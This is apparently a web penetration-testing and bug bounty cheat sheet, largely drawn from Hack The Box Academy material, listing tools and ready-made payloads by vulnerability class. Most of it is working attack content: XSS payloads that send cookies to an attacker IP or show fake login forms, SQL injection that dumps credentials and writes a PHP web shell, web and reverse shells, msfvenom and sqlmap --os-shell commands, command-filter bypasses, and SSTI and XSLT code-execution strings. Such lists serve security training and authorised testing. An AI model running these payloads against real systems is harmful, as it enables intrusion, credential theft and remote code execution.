# Bug Bounty

Overview
---------
1. - [Web Requests](#1---web-requests)
2. - [Web Proxies](#2---web-proxies)
3. - [Web Application Vulnerability Scanners](#3---web-application-vulnerability-scanners)
4. - [Online Resources](#4---online-resources)
5. - [Browser Plugins](#5---browser-plugins)
6. - [Web Reconnaissance](#6---web-reconnaissance)
7. - [Fuzzing](#7---fuzzing)
8. - [JavaScript Deobfuscation](#8---javascript-deobfuscation)
9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
10. - [SQL Injection](#10---sql-injection)
11. - [Command Injection](#11---command-injection)
12. - [File Uploads](#12---file-uploads)
13. - [Server-Side Request Forgery (SSRF)](#13---server-side-request-forgery-ssrf)
14. - [Server-Side Template Injection (SSTI)](#14---server-side-template-injection-ssti)
15. - [Server-Side Includes (SSI) Injection](#15---server-side-includes-ssi-injection)
16. - [eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection](#16---extensible-stylesheet-language-transformations-xslt-server-side-injection)
17. - [Login Brute Forcing](#17---login-brute-forcing)
18. - [Sensitive Data Exposure](#18---sensitive-data-exposure)
19. - [HTML Injection](#19---html-injection)
20. - [Cross-Site Request Forgery (CSRF)](#20---cross-site-request-forgery-csrf)
21. - [Exploit Research](#21---exploit-research)

   
#1. - Web Requests
-----------------------------------------

- Curl

```
$ curl -v <URL>
$ curl -I <URL>
$ curl -i <URL>
$ curl -v -X OPTIONS <URL>
$ curl -u admin:admin <URL>
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' <URL>
$ curl <URL>/search.php?search=test
$ curl -X POST -d 'username=admin&password=admin' <URL>
$ curl -X POST -d '{"search":"test"}' -H 'Content-Type: application/json' <URL>
$ curl <URL>.php -X POST -d 'param1=key' -H 'Content-Type: application/x-www-form-urlencoded'
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
$ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
```

- DevTools

```
F12
```

#2. - Web Proxies
-----------------------------------------

- Burp Suite

```
Proxy -> Intercept -> Open Browser
OR
Settings -> Network Settings -> Settings -> Select Manual proxy configuration -> Enter IP address and port of our proxy -> Select Use this proxy server for all protocols 
```

- ZAP Proxy

```
Firefox Icon
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

#3. - Web Application Vulnerability Scanners
-----------------------------------------

- Nessus

```
https://www.tenable.com/products/nessus/nessus-essentials
```

- Burp Suite

```
https://portswigger.net/burp
```

- ZAP Proxy

```
https://www.zaproxy.org/
```

#4. - Online Resources
-----------------------------------------

- OWASP Web Security Testing Guide

```
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
```

- PayloadsAllTheThings

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
```

- HTML - CSS - JS Online Editor

```
https://html-css-js.com/
```

- HTML WYSIWYG Online Editor

```
https://htmlg.com/html-editor/
```

- JSFiddle Code Playground

```
https://jsfiddle.net/
```

#5. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#6. - Web Reconnaissance
-----------------------------------------

- Whois

```
$ whois <Domain Name>
https://whoisfreaks.com/
```

- DNS

```
Edit /etc/hosts OR C:\Windows\System32\drivers\etc\hosts
$ sudo sh -c 'echo "<IP address>  <Domain Name>" >> /etc/hosts'
$ dig <Domain Name>
$ dig <Domain Name> NS
$ dig <Domain Name> MS
$ dig @1.1.1.1 <Domain Name>
$ dig +trace <Domain Name>
$ dig -x <IP address>
$ dig +short <Domain Name>
$ dig <Domain Name> ANY
$ dig axfr @<Name Server> <Domain Name>
C:\> nslookup <IP address/Domain Name>
$ host <IP address/Domain Name>
$ host -t ns <Domain Name>
$ host -t mx <Domain Name>
$ host -t txt <Domain Name>
$ host -l <Domain Name> <DNS server name/IP address>
$ dnsenum <Domain Name>
$ dnsenum --enum <Domain Name> -f <wordlist> -r
$ dnsrecon -d <Domain Name> -t axfr
$ fierce --domain <Domain Name> --subdomains accounts admin ads
$ theHarvester -d <Domain Name> -b google > google.txt
$ amass enum -d <Domain Name>
$ assetfinder <Domain Name>
$ puredns bruteforce <wordlist> <Domain Name>
$ gobuster vhost -u http://<IP address> -w <wordlist> --append-domain
$ feroxbuster -w <wordlist> -u <URL>
$ ffuf -w <wordlist> -u http://<IP address> -H "HOST: FUZZ.<Domain Name>"
https://crt.sh/
$ curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
https://search.censys.io/
```

- Fingerprinting

```
$ curl -I <URL/Domain Name>
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
https://builtwith.com/
$ whatweb <Domain Name>
$ nmap -O -sC <IP address>
https://searchdns.netcraft.com/
$ wafw00f <Domain Name>
$ nikto -h <Domain Name> -Tuning b
```

- Robots.txt

```
http://<Domain Name>/robots.txt
```

- Well-Known URLs

```
https://<Domain Name>/.well-known/security.txt
https://<Domain Name>/.well-known/change-password
https://<Domain Name>/.well-known/openid-configuration
https://<Domain Name>/.well-known/assetlinks.json
https://<Domain Name>/.well-known/mta-sts.txt
```

- Web Crawlers

```
Burp Suite Spider
OWASP ZAP
Scrapy
Apache Nutch
$ python3 ReconSpider.py <URL>
```

- Scrapy Web Crawler

```
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)

$ jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

- Search Engines

```
https://www.exploit-db.com/google-hacking-database
site:example.com
inurl:login
filetype:pdf
intitle:"confidential report"
intext:"password reset"
cache:example.com
link:example.com
related:example.com
info:example.com
define:phishing
site:example.com numrange:1000-2000
allintext:admin password reset
allinurl:admin panel
allintitle:confidential report 2023
site:example.com AND (inurl:admin OR inurl:login)
"linux" OR "ubuntu" OR "debian"
site:bank.com NOT inurl:login
site:socialnetwork.com filetype:pdf user* manual
site:ecommerce.com "price" 100..500
"information security policy"
site:news.com -inurl:sports
```

- Web Archives

```
https://web.archive.org/
```

- Automated Recon

```
$ python finalrecon.py --headers --whois --url <URL>
$ python finalrecon.py --full --url <URL>
Recon-ng
theHarvester
SpiderFoot
OSINT Framework
```

#7. - Fuzzing
-----------------------------------------

- Directory Fuzzing

```
$ ffuf -w <wordlist>:FUZZ        # assign wordlist to a keyword
$ ffuf -w <wordlist> -u http://<Domain Name>/FUZZ
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ
```

- Extension Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/indexFUZZ
```

- Page Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/FUZZ.php
```

- Recursive Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

- Sub-Domain Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u https://FUZZ.<Domain Name>
```

- VHOST Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>'
```

- Filter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>' -fs 900
```

- GET Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php?FUZZ=key -fs 900
```

- POST Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

- Parameter Value Fuzzing

```
$ for i in $(seq 1 1000); do echo $i >> ids.txt; done        # create text file with numbers 1-1000
$ ffuf -w ids.txt:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

#8 - JavaScript Deobfuscation
-----------------------------------------

- JavaScript Obfuscator

```
https://beautifytools.com/javascript-obfuscator.php
https://obfuscator.io/
https://jsfuck.com/
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html
```

- JavaScript Beautifier

```
https://beautifytools.com/javascript-beautifier.php
Browser Dev Tools -> Pretty Print
https://prettier.io/playground/
https://beautifier.io/
```

- JavaScript Deobfuscator

```
https://matthewfl.com/unPacker.html
http://www.jsnice.org/
```

- JavaScript Console Debugger

```
https://jsconsole.com/
```

- JavaScript Minifier

```
https://www.toptal.com/developers/javascript-minifier
```

- Base64 Encode/Decode

```
$ echo <string> | base64
$ echo <base64 string> | base64 -d
```

- Hex Encode/Decode

```
$ echo <string> | xxd -p
$ echo <hex string> | xxd -p -r
```

- ROT13 Encode/Decode

```
$ echo <string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
$ echo <ROT13 string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
https://rot13.com/
```

- Cipher Identifier & Analyzer

```
https://www.boxentriq.com/code-breaking/cipher-identifier
```

#9. - Cross-Site Scripting (XSS)
-----------------------------------------

- *Reflected XSS (non-persistent - processed on the back-end server)*
   - *Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).*
- *Stored XSS (persistent)*
   - *Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).*
- *DOM XSS (non-persistent - processed on the client-side)*
   - *Occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server and is written to an HTML DOM object (e.g., through client-side HTTP parameters or anchor tags - vulnerable username or page title).*

- Basic XSS Payloads

```
<script>alert("XSS")</script>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<plaintext>
<script>print()</script> 
```

- HTML XSS Payloads

```
<img src="" onerror=alert(window.origin)>	
```

- Deface XSS Payloads

```
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Old Milks</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="Fattest Milks"> </p></center>'</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
<script>document.getElementById('urlform').remove();</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

- Remote Script XSS Payloads

```
<script src="http://<IP address>/script.js"></script>	
```

- Cookie XSS Payloads

```
<script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
```

- DOM XSS Payloads

```
#"><img src=/ onerror=alert(document.cookie)>
<img src="" onerror=alert(window.origin)>
```

- Bulk XSS Payloads

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list
```

- Automated XSS

```
$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"
https://github.com/rajeshmajumdar/BruteXSS
https://github.com/epsylon/xsser
```

#10. - SQL Injection
-----------------------------------------

- *In-band SQL Injection*
   - *Union Based*
      - *Specify the exact location e.g. column which we can read - output printed to front-end.*
   - *Error Based*
      - *Intentionally cause an error - output printed to front-end.* 
- *Blind SQL Injection*
   - *Boolean Based*
      - *Use conditional statements to control whether the page returns any output at all.* 
   - *Time Based*
      - *Use conditional statements that delay the page response e.g. using Sleep().* 
- *Out-of-band SQL Injection*
   - *Direct output to remote location e.g. DNS record.*

- SQL Login

```
$ mysql -u <username> -h <hostname> -P 3306 -p
```

- SQL General Commands

```
SHOW DATABASES;
USE users;
SHOW TABLES;
SELECT * FROM table_name;
```

- SQL Table Commands

```
CREATE TABLE logins (id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME);
CREATE TABLE logins (id INT NOT NULL AUTO_INCREMENT, username VARCHAR(100) UNIQUE NOT NULL, password VARCHAR(100) NOT NULL, date_of_joining DATETIME DEFAULT NOW(), PRIMARY KEY (id));
DESCRIBE logins;
DROP TABLE logins;
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value);
INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value);
INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value), (column2_value, column3_value);
```

- SQL Column Commands

```
SELECT column1, column2 FROM table_name;
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;
UPDATE table_name SET column1=newvalue1, column2=newvalue2 WHERE <condition>;
```

- SQL Output Commands

```
SELECT * FROM logins ORDER BY column_1;
SELECT * FROM logins ORDER BY column_1 DESC;
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT * FROM logins WHERE username like '___';
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
SELECT * FROM logins WHERE username != 'john' OR id > 1;
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

- SQL Discovery Checkers

```
'
"
#
;
)
%27
%22
%23
%3B
%29
```

- SQL Auth Bypass

```
admin' or '1'='1
admin')-- -
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

- SQL Union Injection (comments -- need a space after them to work, the hyphen is there for readability)

```
' order by 1-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,@@version,3,4-- -
UNION select username, 2, 3, 4 from passwords-- -
```

- SQL DB Enumeration

```
SELECT @@version
SELECT POW(1,1)
SELECT SLEEP(5)
SELECT * FROM my_database.users;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),3,4-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

- SQL Privilege Checks

```
SHOW GRANTS;
SELECT USER()
cn' UNION SELECT 1, user(), 3, 4-- -
SELECT CURRENT_USER()
SELECT user from mysql.user
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, user(), 3, 4-- -
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
SHOW VARIABLES LIKE 'secure_file_priv';
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

- SQL File Injection

```
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
SELECT * from users INTO OUTFILE '/tmp/credentials';
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

- SQLMap

```
$ sqlmap -u <URL> --batch --dump
$ sqlmap <URL> --data 'uid=1&name=test'
$ sqlmap <URL> --data 'uid=1*&name=test'        # use * to specify the parameter to inject e.g. to test HTTP headers like cookie header 
$ sqlmap <URL> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
$ sqlmap -u <URL> --data='id=1' --method PUT
$ sqlmap -u <URL> --batch -t /tmp/traffic.txt
$ sqlmap -u <URL> --parse-errors
$ sqlmap -u <URL> -v 6 --batch
$ sqlmap -u <URL> --proxy=http://127.0.0.1:8080
$ sqlmap -u <URL> --prefix="%'))" --suffix="-- -"
$ sqlmap -u <URL> -v 3 --level=5
$ sqlmap -u <URL> --level=5 --risk=3
$ sqlmap -u <URL> --banner --current-user --current-db --is-dba
$ sqlmap -u <URL> --tables -D testdb
$ sqlmap -u <URL> --dump-all
$ sqlmap -u <URL> --dump-all --exclude-sysdbs
$ sqlmap -u <URL> --dump -D testdb
$ sqlmap -u <URL> --dump -T users -D testdb
$ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
$ sqlmap -u <URL> --dump -T users -D testdb --start=2 --stop=3
$ sqlmap -u <URL> --dump -T users -D testdb --where="name LIKE 'f%'"
$ sqlmap -u <URL> --schema
$ sqlmap -u <URL>--search -T user
$ sqlmap -u <URL> --passwords --batch
$ sqlmap -u <URL> --passwords --batch --all
$ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="<CSRF token parameter>"
$ sqlmap -u <URL> --randomize=rp --batch -v 5 | grep URI
$ sqlmap <URL> --random-agent
$ sqlmap -u <URL> --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
$ sqlmap --list-tampers
$ sqlmap -u <URL> --tamper=between
$ sqlmap -u <URL> --is-dba
$ sqlmap -u <URL> --file-read "/etc/passwd"
$ sqlmap -u <URL> --file-write "shell.php" --file-dest "/var/www/html/shell.php"
$ sqlmap -u <URL> --os-shell
```

- SQLMAP .req file

```
Copy the entire request from Burp
$ vi login.req
Paste the entire request from Burp
$ sqlmap -r login.req
```

#11. - Command Injection
-----------------------------------------

- Common Injection Operators

```
SQL Injection =	' , ; -- /* */
Command Injection =	; &&
LDAP Injection =	* ( ) & |
XPath Injection =	' or and not substring concat count
OS Command Injection =	; & |
Code Injection =	' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal =	../ ..\\ %00
Object Injection =	; & |
XQuery Injection =	' ; -- /* */
Shellcode Injection =	\x \u %u %n
Header Injection =	\n \r\n \t %0d %0a %09
```

- Command Injection Operators

```
; (URL-Encoded = %3b)
\n (URL-Encoded = %0a)
& (URL-Encoded = %26)
| (URL-Encoded = %7c)
&& (URL-Encoded = %26%26)
|| (URL-Encoded = %7c%7c)
`` (Linux only - wrap command in backticks) (URL-Encoded = %60%60)
$() (Linux only - wrap command in parentheses) (URL-Encoded = %24%28%29)
```

- Bypass Space Filters

```
Spaces (URL-Encoded = %20)
Tabs (URL-Encoded = %09)
${IFS} Linux Environment Variable
{ls,-la} Bash Brace Expansion
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
```

- Bypass Other Characters (Environment Variables)

```
printenv = Can be used to view all environment variables (Linux)
Get-ChildItem Env: = Can be used to view all environment variables (Windows)
${PATH:0:1} = /
${LS_COLORS:10:1} = ;
%HOMEPATH:~0,-17% = \
%HOMEPATH:~6,-11% = \
%PROGRAMFILES:~10,-5% = (space)
$env:HOMEPATH[0] = \
$env:PROGRAMFILES[10] = (space)
$(tr '!-}' '"-~'<<<[) =	Shift character by one ([ -> \)
```

- Bypass Command Filters

```
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
who^ami
```

- Bypass Advanced Command Filters

```
WHOAMI
WhOaMi
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
echo 'whoami' | rev
$(rev<<<'imaohw')
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<dwBoAG8AYQBtAGkA)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion
```

- Automated Obfuscation Tools

```
https://github.com/Bashfuscator/Bashfuscator
$ ./bashfuscator -c 'cat /etc/passwd'
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
https://github.com/danielbohannon/Invoke-DOSfuscation
PS C:\> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
PS C:\> encoding
PS C:\> 1
```

#12. - File Uploads
-----------------------------------------

- PHP File Read

```
<?php file_get_contents('/etc/passwd'); ?>
```

- PHP Command Execution

```
<?php system('hostname'); ?>
```

- PHP Web Shell

```
<?php system($_REQUEST['cmd']); ?>
https://github.com/Arrexel/phpbash
```

- PHP Reverse Shell

```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
https://github.com/pentestmonkey/php-reverse-shell
```

- ASP Web Shell

```
<% eval request('cmd') %>
```

- Bulk Web/Reverse Shells

```
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
```

- MSFVenom

```
$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<port> -f raw > reverse.php	
```

- Upload Bypasses

```
shell.phtml
shell.pHp
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
shell.jpg.php
shell.php.jpg
%20, %0a, %00, %0d0a, /, .\, ., …, :
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
https://en.wikipedia.org/wiki/List_of_file_signatures
```

- File Permutation Bash Script

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

- Limited Uploads

```
XSS = HTML, JS, SVG, GIF
XXE/SSRF = XML, SVG, PDF, PPT, DOC
DoS = ZIP, JPG, PNG
```

- File Name Injections

```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
file';select+sleep(5);--.jpg
file<script>alert(window.origin);</script>.jpg
```

#13. - Server-Side Request Forgery (SSRF)
-----------------------------------------

- External Access

```
$ nc -nlvp 8000
dateserver=http://<Attacker IP address>:8000&date=2024-01-01
```

- Internal Access

```
dateserver=http://127.0.0.1/index.php&date=2024-01-01
```

- Internal Port Scan

```
dateserver=http://127.0.0.1:81&date=2024-01-01
dateserver=http://127.0.0.1:82&date=2024-01-01
$ seq 1 10000 > ports.txt
$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

- Internal Directory Brute-Force

```
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

- Local File Inclusion (LFI)

```
dateserver=file:///etc/passwd&date=2024-01-01
```

- Gopher POST Request

```
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
$ python2.7 gopherus.py --exploit smtp
```

#14. - Server-Side Template Injection (SSTI)
-----------------------------------------

- Test String

```
${{<%[%'"}}%\.
```

- Identify the Template Engine

```
${7*7} (if this executes) -> a{*comment*}b (if this executes) = Smarty
${7*7} (if this executes) -> a{*comment*}b (if this does not execute) -> ${"z".join("ab")} (if this executes) = Mako
${7*7} (if this executes) -> a{*comment*}b (if this does not execute) -> ${"z".join("ab")} (if this does not execute) = Unknown

${7*7} (if this does not execute) -> {{7*7}} (if this does not execute) = Not Vulnerable
${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if this executes as 7777777) = Jinja2
${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if this executes as 49) = Twig
${7*7} (if this does not execute) -> {{7*7}} (if this executes) = {{7*'7'}} (if this does not execute) = Unknown
```

- Jinja

```
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

- Twig

```
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

- Automated Exploitation

```
https://github.com/epinna/tplmap
https://github.com/vladko312/SSTImap
$ python3 sstimap.py
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

#15. - Server-Side Includes (SSI) Injection
-----------------------------------------

- Print Variable

```
<!--#printenv -->
```

- Change Config

```
<!--#config errmsg="Error!" -->
```

- Print Specific Variable

```
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

- Execute Command

```
<!--#exec cmd="whoami" -->
```

- Include Web File

```
<!--#include virtual="index.html" -->
```

#16. - eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
-----------------------------------------

- Information Disclosure

```
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
<xsl:value-of select="system-property('xsl:product-name')" />
<xsl:value-of select="system-property('xsl:product-version')" />
```

- Local File Inclusion (LFI)

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

- Remote Code Execution (RCE)

```
<xsl:value-of select="php:function('system','id')" />
```

#17. - Login Brute Forcing
-----------------------------------------

#18. - Sensitive Data Exposure
-----------------------------------------

- Source Code

```
Right-click -> View page source
OR
CTRL + U
```

#19. - HTML Injection
-----------------------------------------

- Hyperlink

```
<a href="http://www.google.com">Click Me</a>
```


#20. - Cross-Site Request Forgery (CSRF)
-----------------------------------------

- Password Change

```
"><script src=//www.example.com/exploit.js></script>
```

#21. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```
